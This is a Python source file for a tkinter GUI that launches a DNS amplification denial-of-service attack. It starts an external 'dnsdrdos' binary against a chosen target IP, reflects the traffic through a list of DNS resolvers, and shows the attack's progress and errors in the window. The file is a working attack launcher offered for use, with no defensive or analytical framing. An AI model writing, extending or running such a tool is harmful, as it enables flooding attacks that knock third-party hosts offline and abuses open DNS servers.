import threading
import traceback
import subprocess
import signal

from tkinter import *

def startDnsAmplification(targetIp, dnsPackets, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
    global dnsAmplificationIsRunning, dnsAmplificationThreads, terminalLabel, wiresharkLabel, errorOutputLabel

    dnsAmplificationIsRunning = False
    dnsAmplificationThreads = threading.Thread(target = lambda : sendDnsPackets(targetIp, dnsPackets))

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    terminalLabel.configure(bg = colorConfig) 
    wiresharkLabel.configure(bg = colorConfig)
    errorOutputLabel.configure(bg = colorConfig)

    terminalLabel["text"] += "$ Running DNS Amplification Attack...\n\n"

    runDnsAmplification()

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopDnsAmplification() :
    global dnsAmplificationThreads, dnsAmplificationIsRunning

    try:
        terminalLabel["text"] += "\n$ Stopping DNS Amplification Attack...\n\n"
        dnsAmplificationIsrunning = False
        dnsAmplificationThreads.join(0)
        dnsAmplificationThreads = None

        process.send_signal(signal.SIGINT)

        terminalLabel["text"] += "$ DNS Amplification Attack successfully stopped!\n"
    except (AttributeError, RuntimeError):
        errorOutputLabel["text"] += traceback.format_exc()
    except Exception as e:
        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"

def runDnsAmplification() :
    global dnsAmplificationThreads, dnsAmplificationIsRunning
    dnsAmplificationIsRunning = True
    dnsAmplificationThreads.start()

def sendDnsPackets(targetIp, dnsPackets):
    global process
    terminalLabel["text"] += "$ Target IP : " + targetIp + "\n"
    terminalLabel["text"] += "$ Amount of DNS Packets : " + dnsPackets + "\n"
    process = subprocess.Popen(["./dnsdrdos", "-f", "dnsList.txt", "-s", targetIp, "-l", dnsPackets])
    